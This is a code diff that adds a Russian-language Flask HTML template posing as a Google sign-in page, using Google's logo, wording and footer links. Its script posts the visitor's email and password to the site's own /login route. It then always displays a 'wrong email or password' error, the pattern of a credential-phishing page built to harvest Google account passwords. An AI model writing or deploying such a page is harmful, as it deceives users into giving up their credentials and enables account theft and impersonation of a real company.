@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход через Google</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles/auth.css') }}">
+</head>
+<body>
+    <div class="auth-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        <h1>Вход через Google</h1>
+        <form id="loginForm">
+            <input type="text" id="email" name="email" placeholder="Адрес эл. почты" required>
+            <input type="password" id="password" name="password" placeholder="Введите пароль" required>
+            <button type="submit">Войти</button>
+        </form>
+
+        <!-- Сообщение об ошибке -->
+        <p id="message" style="color: red; font-size: 14px; margin-top: 10px;"></p>
+
+        <!-- Дополнительные ссылки -->
+        <p><a href="#">Забыли адрес электронной почты?</a></p>
+        <p>Не ваш компьютер? Включите гостевой режим, чтобы защитить данные в аккаунте. <a href="#">Подробнее об использовании гостевого режима</a></p>
+
+        <!-- Футер -->
+        <div class="footer">
+            <a href="#">Русский</a> | 
+            <a href="#">Справка</a> | 
+            <a href="#">Конфиденциальность</a> | 
+            <a href="#">Условия</a>
+        </div>
+    </div>
+
+    <script>
+        // Обработка отправки формы
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault(); // Отменяем стандартное поведение формы
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ email, password }),
+                });
+
+                const data = await response.json();
+
+                // Всегда показываем сообщение об ошибке
+                document.getElementById('message').textContent = data.error || 'Неверная почта или пароль';
+                document.getElementById('message').style.color = 'red';
+            } catch (error) {
+                document.getElementById('message').textContent = 'Ошибка при отправке запроса';
+                document.getElementById('message').style.color = 'red';
+            }
+        });
+    </script>
+</body>
+</html>
